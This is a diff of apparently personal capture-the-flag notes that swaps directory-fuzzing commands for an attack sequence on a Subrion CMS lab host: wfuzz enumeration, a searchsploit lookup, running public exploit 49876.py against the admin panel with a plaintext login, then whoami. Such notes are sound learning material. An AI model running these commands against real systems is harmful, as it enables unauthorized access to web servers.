@@ -440,11 +440,17 @@ DR-->Disaster Recovery Plan
                           get enter.txt
 
                           cat enter.txt
-                          wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://10.10.251.44/FUZZ -t 200 --hc 404,403
-                          dirb http://10.10.251.44/subrion/ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -r -f -N 302 
-                          wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.251.44/subrion/FUZZ -t 200 --hc 404,403,302,301
-                            wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.251.44/subrion/FUZZ -t 200 --sc 200
-                          
+                           wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u http://10.10.61.63/subrion/FUZZ -t 200 --sc 200
+                           searchsploit subrion
+                          searchsploit subrion [version]
+                          ll
+                          python 49876[file type].py
+                          python 49876.py -u http://10.10.61.63/subrion/panel/ -l 'admin' -p 'Scam2021'
+                          whoami
+                          ls
+                       
+
+
                           
 
 
